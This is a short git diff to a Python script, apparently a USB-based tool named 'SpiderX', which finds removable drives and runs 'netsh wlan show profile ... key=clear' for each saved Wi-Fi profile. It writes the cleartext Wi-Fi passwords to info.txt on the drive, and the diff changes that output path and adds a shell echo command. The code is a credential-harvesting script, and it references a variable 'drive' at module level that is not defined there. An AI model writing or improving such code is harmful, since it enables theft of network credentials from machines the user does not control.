@@ -1,3 +1,4 @@
+
 import subprocess
 
 def get_removable_drives():
@@ -52,7 +53,9 @@ def mainfunction():
     cleaned_data = [item.strip() for item in access_point if item.strip()]
     return cleaned_data
 
-
+path = f"{drive}\\SpiderX\\SpiderX\\WIFI-password\\info.txt"
+MakeFileCmd =  f'echo "[Check out key-content]" > {path}'
+subprocess.run(MakeFileCmd,shell=True)
 
 def collect_info():
     # Run the command and capture its output
@@ -61,10 +64,10 @@ def collect_info():
         command = f'netsh wlan show profile name="{i}" key=clear'
         # Decode the bytes output to string
         output_str = run_command(command)
-        path = f"{drive}\\SpiderX\\WIFI-password\\SpiderX\\info.txt"
         with open(path, "a") as F:
             F.writelines(output_str)
             F.write("\n")
+        
 
 
 collect_info()
